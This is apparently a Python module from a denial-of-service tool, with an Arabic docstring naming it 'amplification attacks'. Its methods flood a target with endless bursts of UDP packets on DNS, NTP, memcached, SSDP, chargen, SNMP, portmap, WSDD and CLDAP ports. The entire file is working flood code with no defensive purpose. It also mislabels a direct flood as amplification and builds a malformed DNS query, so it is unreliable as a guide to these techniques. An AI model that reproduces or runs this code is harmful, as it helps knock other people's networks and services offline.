#!/usr/bin/env python3
"""
هجمات Amplification - تضخيم الحركة
"""

import socket
import struct
import random
import dns.message
import dns.rdatatype
import base64

class AmplificationAttacks:
    def __init__(self, killer):
        self.killer = killer
        
    def dns_amplification(self, target):
        """DNS Amplification"""
        while self.killer.running:
            try:
                query = dns.message.make_query('.'*63 + '.com', dns.rdatatype.ANY)
                query.id = random.randint(0, 65535)
                
                sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                
                for _ in range(10000):
                    sock.sendto(query.to_wire(), (target, 53))
                    
                sock.close()
                
                with self.killer.lock:
                    self.killer.stats['packets'] += 10000
            except:
                pass
    
    def ntp_amplification(self, target):
        """NTP Amplification"""
        while self.killer.running:
            try:
                # NTP monlist request
                packet = struct.pack('!BBBB', 0x17, 0x03, 0x2a, 0x00) + b'\x00' * 428
                
                sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                
                for _ in range(10000):
                    sock.sendto(packet, (target, 123))
                    
                sock.close()
                
                with self.killer.lock:
                    self.killer.stats['packets'] += 10000
            except:
                pass
    
    def memcached_amplification(self, target):
        """Memcached Amplification"""
        while self.killer.running:
            try:
                packet = b'\x00\x00\x00\x00\x00\x01\x00\x00stats\r\n'
                
                sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                
                for _ in range(10000):
                    sock.sendto(packet, (target, 11211))
                    
                sock.close()
                
                with self.killer.lock:
                    self.killer.stats['packets'] += 10000
            except:
                pass
    
    def ssdp_amplification(self, target):
        """SSDP Amplification"""
        while self.killer.running:
            try:
                packet = b'M-SEARCH * HTTP/1.1\r\nHOST: 239.255.255.250:1900\r\nMAN: "ssdp:discover"\r\nMX: 2\r\nST: ssdp:all\r\n\r\n'
                
                sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                
                for _ in range(10000):
                    sock.sendto(packet, (target, 1900))
                    
                sock.close()
                
                with self.killer.lock:
                    self.killer.stats['packets'] += 10000
            except:
                pass
    
    def chargen_amplification(self, target):
        """Chargen Amplification"""
        while self.killer.running:
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                
                for _ in range(10000):
                    sock.sendto(b'\x00'*512, (target, 19))
                    
                sock.close()
                
                with self.killer.lock:
                    self.killer.stats['packets'] += 10000
            except:
                pass
    
    def snmp_amplification(self, target):
        """SNMP Amplification"""
        while self.killer.running:
            try:
                # SNMP GetBulk request
                packet = base64.b64decode('g2QBgQQAAAAHMAgAEC0AAwECAwQFZm9v')
                
                sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                
                for _ in range(10000):
                    sock.sendto(packet, (target, 161))
                    
                sock.close()
                
                with self.killer.lock:
                    self.killer.stats['packets'] += 10000
            except:
                pass
    
    def portmap_amplification(self, target):
        """Portmap Amplification"""
        while self.killer.running:
            try:
                packet = struct.pack('!IIII', 0, 2, 100000, 4) + b'\x00'*4
                
                sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                
                for _ in range(10000):
                    sock.sendto(packet, (target, 111))
                    
                sock.close()
                
                with self.killer.lock:
                    self.killer.stats['packets'] += 10000
            except:
                pass
    
    def wsdd_amplification(self, target):
        """WSDD Amplification"""
        while self.killer.running:
            try:
                packet = b'<?xml version="1.0"?><s:Envelope><s:Body><Probe><Types>wsdp:Device</Types></Probe></s:Body></s:Envelope>'
                
                sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                
                for _ in range(10000):
                    sock.sendto(packet, (target, 3702))
                    
                sock.close()
                
                with self.killer.lock:
                    self.killer.stats['packets'] += 10000
            except:
                pass
    
    def cldap_amplification(self, target):
        """CLDAP Amplification"""
        while self.killer.running:
            try:
                # CLDAP rootDSE request
                packet = base64.b64decode('MAMCAWUEAAEBAAAAAAAAAAQBAAAA')
                
                sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                
                for _ in range(10000):
                    sock.sendto(packet, (target, 389))
                    
                sock.close()
                
                with self.killer.lock:
                    self.killer.stats['packets'] += 10000
            except:
                pass
